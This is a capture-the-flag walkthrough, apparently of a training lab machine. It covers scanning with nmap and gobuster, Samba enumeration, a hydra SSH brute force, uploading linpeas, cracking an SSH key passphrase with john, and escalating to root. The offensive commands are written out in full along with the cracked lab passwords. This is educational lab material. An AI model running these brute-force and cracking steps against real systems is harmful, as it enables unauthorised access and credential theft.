Enumeration/Scanning
* nmap scan
	* mkdir nmap
	* nmap -sC -sV -oN nmap/initial 10.10.222.42
		* -sC: Default script scan
		* -sV Probe open ports to determine service/version info
		* -oN: output to file
	* Discovered:
		* port 22
		* port 80
		* port 139
		* port 445
		* port 8009
		* port 8080
		* Samba server

Checked website, has hidden message in HTML.
* There is a dev folder. 

Used gobuster to discover hidden directories
* gobuster dir -u http://10.10.222.42 -w /usr/share/wordlists/dirb/common.txt
* Found /development/

Development contains 2 files
* dev.txt
	* mentions 2 people, K and J
	* mentions Samba structs
	* version 2.5.12
* j.txt
	* mentions a /etc/shadow directory where credentials are located
	* pass easily cracked K said


Nothing else can be found. Since this is Samba, I can use enum4linux to enumerate the Samba server.

host name basic4

users:
* jan
* kay

Exploitation
jan has a weak password. I can use hydra to brute force SSH on the username jan
* hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.222.42
* cracked the password and got armando

accessed the server using SSH into jan's account.

Privilege Escalation
I was not able to find anything so I used scp to copy linpeas to the server
* scp /home/kali/Downloads/linpeas.sh jan@10.10.246.115:/dev/shm
* /dev/shm
	* "shared memory" works well

I than ran linpeas.
* ./linpeas | tee linlog.txt

There is a visible private key for kay!

copy the private key and place it into a file called kay_id_rsa
* change permissions to read only for me.
	* chmod 600 kay_id_rsa
	* for some reason rsa likes this for it to work

ssh -i kay_id_rsa kay@10.10.246.115
* key requires a passphrase.

Now I will use john the ripper to discover the password for the file.
* ssh2john kay_id_rsa
	* creates a hash john can understand.
* john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt

discovered the passphrase beeswax

I now attempted to ssh into kay.
* ssh -i kay_id_rsa kay@10.10.246.115

I accessed kay and read the password file. I copied it and logged into root using the password. I then went to roots home directory and received the flag there.
